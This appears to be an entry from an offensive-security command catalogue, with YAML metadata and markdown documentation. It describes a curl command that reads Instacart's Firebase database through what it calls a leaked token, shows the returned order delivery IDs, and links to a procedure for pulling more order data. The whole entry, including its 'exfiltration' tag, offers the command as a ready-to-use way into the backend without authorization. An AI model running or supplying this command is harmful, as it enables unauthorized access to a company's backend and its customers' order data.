---
id: cmd-curl-firebase-instacart
data: >-
  curl
  https://instacart.firebaseio.com/order_deliveries/xy8TcFsDZiKm1JwnqqFp.json
tags:
  - exfiltration
  - api-query
type: command
output: >-
  {"46671792":"","46671794":"","46671795":"","46671802":"","46671804":"","46872067":"","46872104":"","46872195":"","46872357":""}
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:29:57.163Z'
verified: false
validated: true
submitted: true
---
# curl-firebase-order-deliveries

## Command

```bash
curl https://instacart.firebaseio.com/order_deliveries/xy8TcFsDZiKm1JwnqqFp.json
```

## Description

This command queries the Instacart Firebase Realtime Database using a leaked token to retrieve a list of order delivery IDs, demonstrating unauthorized access to backend data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Full Firebase endpoint path including the exposed token/node (e.g., https://instacart.firebaseio.com/order_deliveries/{token}.json) | Yes |

## Examples

### Basic Usage

```bash
curl https://instacart.firebaseio.com/order_deliveries/xy8TcFsDZiKm1JwnqqFp.json
```

### Advanced Usage

Add verbose output for debugging:

```bash
curl -v https://instacart.firebaseio.com/order_deliveries/xy8TcFsDZiKm1JwnqqFp.json
```

## Expected Output

JSON object listing empty-string valued order delivery IDs, indicating accessible nodes: {"46671792":"","46671794":"",...}. Indicates successful read without auth.

## Related

- [[Related Procedure: Exploit Leaked Firebase Tokens to Retrieve Additional Order Data]]
